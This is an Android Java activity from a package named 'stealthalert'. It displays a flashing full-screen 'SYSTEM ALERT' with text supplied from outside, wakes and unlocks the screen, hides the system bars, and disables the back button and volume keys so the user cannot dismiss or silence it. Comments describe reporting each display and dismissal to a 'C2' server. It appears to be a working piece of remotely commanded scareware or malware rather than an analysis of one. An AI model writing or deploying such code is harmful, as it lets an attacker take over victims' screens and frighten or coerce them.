package com.stealthalert;

import android.animation.ArgbEvaluator;
import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class AlertActivity extends Activity {

    // Scales to 0 threads when idle — no lingering thread leaks.
    private static final ExecutorService logExecutor = new ThreadPoolExecutor(
            0, 1, 30L, TimeUnit.SECONDS, new SynchronousQueue<>()
    );

    // Cached once globally — eliminates per-frame allocations inside evaluate().
    private static final ArgbEvaluator ARGB_EVALUATOR = new ArgbEvaluator();

    // Single Handler tied to the main looper — view-independent, so removeCallbacks()
    // is guaranteed to target the same queue that post() used.
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private ValueAnimator colorAnim;
    private AnimatorSet   scaleAnimSet;
    private LinearLayout  container;
    private TextView      titleView;
    private File          internalLogFile;
    private Runnable      pendingAnimInit;

    /**
     * Logs errors asynchronously.
     * Timestamp captured on the calling thread — not inside the lambda —
     * so it is always accurate even if the executor queue is briefly backed up.
     */
    private static void logError(final File logFile, final String msg, final Throwable e) {
        if (logFile == null) return;
        final long   ts      = System.currentTimeMillis();
        final String fullMsg = ts + " [AlertActivity] " + msg + (e != null ? ": " + e : "");
        try {
            // REWRITTEN: Swapped out lambda syntax for a standard Runnable class structure
            logExecutor.execute(new Runnable() {
                @Override
                public void run() {
                    try (BufferedWriter w = new BufferedWriter(new FileWriter(logFile, true))) {
                        w.write(fullMsg + "\n");
                    } catch (Exception ignored) {}
                }
            });
        } catch (Exception ignored) {
            // RejectedExecutionException if executor is shutting down or flooded.
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            super.onCreate(savedInstanceState);

            // Resolve log file path.
            final File baseDir = getFilesDir();
            if (baseDir != null) {
                internalLogFile = new File(baseDir, "alert_errors.txt");
            }

            // --- Window flags ---
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            } else {
                getWindow().addFlags(
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
            }
            getWindow().addFlags(
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                    | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);

            // --- Intent extras — single getIntent() call ---
            final Intent intent = getIntent();
            String title = intent != null ? intent.getStringExtra("title") : null;
            String text  = intent != null ? intent.getStringExtra("text")  : null;
            if ((text == null || text.isEmpty()) && intent != null) {
                text = intent.getStringExtra(Intent.EXTRA_TEXT);
            }
            if ((text == null || text.isEmpty()) && intent != null) {
                text = intent.getStringExtra("message");
            }
            if ((text == null || text.isEmpty()) && intent != null) {
                text = intent.getStringExtra("alert_text");
            }
            if ((title == null || title.isEmpty()) && intent != null) {
                title = intent.getStringExtra(Intent.EXTRA_TITLE);
            }
            if ((title == null || title.isEmpty()) && intent != null) {
                title = intent.getStringExtra("subject");
            }
            if (title == null || title.isEmpty() || "1".equals(title)) {
                title = "⚠ SYSTEM ALERT ⚠";
            }
            if (text == null || text.isEmpty()) {
                text = "CRITICAL WARNING RECEIVED";
            }

            // --- Layout ---
            // Cache density once; avoids repeated DisplayMetrics lookups.
            final float density = getResources().getDisplayMetrics().density;
            final int   pad80   = (int) (80 * density);

            container = new LinearLayout(this);
            container.setOrientation(LinearLayout.VERTICAL);
            container.setGravity(Gravity.CENTER);
            container.setPadding(pad80, pad80, pad80, pad80);
            container.setLayoutParams(new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.MATCH_PARENT));

            titleView = new TextView(this);
            titleView.setText(title);
            titleView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 48f);
            titleView.setTextColor(0xFFFFFFFF);
            titleView.setTypeface(Typeface.DEFAULT_BOLD);
            titleView.setGravity(Gravity.CENTER);
            titleView.setPadding(0, 0, 0, pad80);
            // GPU texture layer: composites the continuously-scaled view once per frame
            // instead of re-drawing it — genuine rendering win for animated views.
            titleView.setLayerType(View.LAYER_TYPE_HARDWARE, null);

            final TextView textView = new TextView(this);
            textView.setText(text);
            textView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 28f);
            textView.setTextColor(0xFFEEEEEE);
            textView.setGravity(Gravity.CENTER);
            textView.setLayoutParams(new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT));

            container.addView(titleView);
            container.addView(textView);
            setContentView(container);

            // --- Fullscreen / immersive ---
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    final WindowInsetsController wic = getWindow().getInsetsController();
                    if (wic != null) {
                        wic.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                        wic.setSystemBarsBehavior(
                                WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                    }
                } catch (Exception e) {
                    logError(internalLogFile, "Unable to apply immersive mode", e);
                }
            } else {
                //noinspection deprecation
                getWindow().getDecorView().setSystemUiVisibility(
                        View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
            }

            // --- Animations deferred until after first layout pass ---
            // Posted via mainHandler (not container.post) so removeCallbacks() in
            // onDestroy is guaranteed to target the exact same message queue.
            // REWRITTEN: Swapped out lambda syntax for a standard Runnable class structure
            pendingAnimInit = new Runnable() {
                @Override
                public void run() {
                    // ofFloat avoids boxing; fraction fed directly into the cached evaluator.
                    colorAnim = ValueAnimator.ofFloat(0f, 1f);
                    colorAnim.setDuration(400);
                    colorAnim.setRepeatCount(ValueAnimator.INFINITE);
                    colorAnim.setRepeatMode(ValueAnimator.REVERSE);
                    // REWRITTEN: Swapped out lambda syntax for AnimatorUpdateListener implementation
                    colorAnim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
                        @Override
                        public void onAnimationUpdate(ValueAnimator animator) {
                            final float fraction = animator.getAnimatedFraction();
                            final int color = (int) ARGB_EVALUATOR.evaluate(
                                    fraction, 0xFFAA0000, 0xFF110000);
                            container.setBackgroundColor(color);
                        }
                    });
                    colorAnim.start();

                    // Scale pulse — bundled via AnimatorSet to reduce choreographer ticks.
                    final ObjectAnimator scaleX =
                            ObjectAnimator.ofFloat(titleView, View.SCALE_X, 1f, 1.15f);
                    final ObjectAnimator scaleY =
                            ObjectAnimator.ofFloat(titleView, View.SCALE_Y, 1f, 1.15f);
                    scaleX.setRepeatCount(ValueAnimator.INFINITE);
                    scaleY.setRepeatCount(ValueAnimator.INFINITE);
                    scaleX.setRepeatMode(ValueAnimator.REVERSE);
                    scaleY.setRepeatMode(ValueAnimator.REVERSE);

                    scaleAnimSet = new AnimatorSet();
                    scaleAnimSet.playTogether(scaleX, scaleY);
                    scaleAnimSet.setDuration(500);
                    scaleAnimSet.start();
                }
            };
            mainHandler.post(pendingAnimInit);

            // Notify C2 that the alert is now visible on-screen.
            LocalSocketReporter.send("{\"event\":\"alert_shown\"}");

        } catch (Exception e) {
            logError(internalLogFile, "Crash in onCreate", e);
        }
    }

    @Override
    protected void onDestroy() {
        // Notify C2 that the alert has been dismissed/cleared.
        LocalSocketReporter.send("{\"event\":\"alert_dismissed\"}");

        // Cancel pending animation init if Activity is torn down before it fires.
        // Safe because mainHandler is the same queue used in post() above.
        if (pendingAnimInit != null) {
            mainHandler.removeCallbacks(pendingAnimInit);
            pendingAnimInit = null;
        }
        if (colorAnim != null) {
            colorAnim.removeAllUpdateListeners();
            colorAnim.cancel();
            colorAnim = null;
        }
        if (scaleAnimSet != null) {
            scaleAnimSet.cancel();
            scaleAnimSet = null;
        }
        // Release GPU layer — avoids holding a hardware texture after Activity is gone.
        if (titleView != null) {
            titleView.setLayerType(View.LAYER_TYPE_NONE, null);
            titleView = null;
        }
        container = null;
        super.onDestroy();
    }

    /** Back button intentionally disabled — alert must not be dismissed by the user. */
    @Override
    public void onBackPressed() {
        // Intentionally blocked.
    }

    /** Volume keys consumed — alert must not be silenced by the user. */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_VOLUME_UP:
            case KeyEvent.KEYCODE_VOLUME_DOWN:
            case KeyEvent.KEYCODE_VOLUME_MUTE:
                return true;
            default:
                return super.onKeyDown(keyCode, event);
        }
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_VOLUME_UP:
            case KeyEvent.KEYCODE_VOLUME_DOWN:
            case KeyEvent.KEYCODE_VOLUME_MUTE:
                return true;
            default:
                return super.onKeyUp(keyCode, event);
        }
    }
}